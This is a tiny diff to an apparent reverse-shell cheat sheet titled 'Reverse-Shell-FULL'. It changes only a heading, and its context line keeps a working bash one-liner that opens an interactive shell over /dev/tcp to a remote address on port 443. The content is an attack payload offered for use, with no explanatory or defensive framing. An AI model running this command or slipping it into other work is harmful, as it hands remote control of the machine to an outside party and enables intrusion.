@@ -1,4 +1,4 @@
-- text in red Reverse-Shell-FULL
+- Reverse-Shell-FULL
 
 ## bash
 bash -i >& /dev/tcp/192.168.1.2/443 0>&1
